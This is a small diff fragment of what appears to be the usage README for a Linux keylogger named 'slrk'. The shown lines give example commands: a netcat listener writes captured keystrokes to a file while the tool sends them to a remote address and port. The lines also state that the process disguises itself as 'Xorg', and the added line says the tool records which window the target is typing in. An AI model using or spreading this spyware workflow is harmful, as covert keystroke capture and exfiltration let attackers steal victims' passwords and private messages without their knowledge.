@@ -15,5 +15,6 @@ EXAMPLE<br>
 Server$ nc -lvp 8888 > logger.txt<br><br>
 Client#./slrk -m remote -a 127.0.0.1 -p 8888<br>
 __________________________________________________________________________
+<br>(It shows the active window on which the target is writing)
 <br>(Keys are mapped on English keyboard)<br>
 (Process name is renamed as "Xorg")
